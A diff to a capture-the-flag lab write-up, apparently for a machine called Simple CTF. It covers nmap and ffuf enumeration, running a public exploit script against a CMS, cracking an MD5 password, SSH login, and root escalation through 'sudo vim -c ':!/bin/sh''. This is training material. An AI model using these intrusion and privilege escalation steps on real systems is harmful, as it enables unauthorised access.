@@ -6,14 +6,16 @@
 
 ---
 
-## Enumeration (nmap)
+## Enumeration 
+
+### Nmap
 
 - ftp - vsftpd 3.0.3
   - Anonymous FTP login allowed
 - http - Apache httpd 2.4.18 ((Ubuntu))
 - ssh (2222) - OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
 
-### http
+### HTTP
 
 - robots.txt
 
@@ -24,7 +26,7 @@ Disallow: /openemr-5_0_1_3
 # End of "$Id: robots.txt 3494 2003-03-19 15:37:44Z mike $".
 ```
 
-- directory (ffuf)
+- directory brute forcing with (ffuf)
 
 ```
 simple
@@ -52,6 +54,8 @@ python2 46635.py http://10.10.33.97/simple/
 - https://www.dcode.fr/md5-hash
 - password - `secret`
 
+## User Access
+
 - with this credential enter ssh
 
 ```sh
@@ -65,7 +69,7 @@ User mitch may run the following commands on Machine:
     (root) NOPASSWD: /usr/bin/vim
 ```
 
-- get root access
+## Root Access
 
 ```sh
 sudo vim -c ':!/bin/sh'
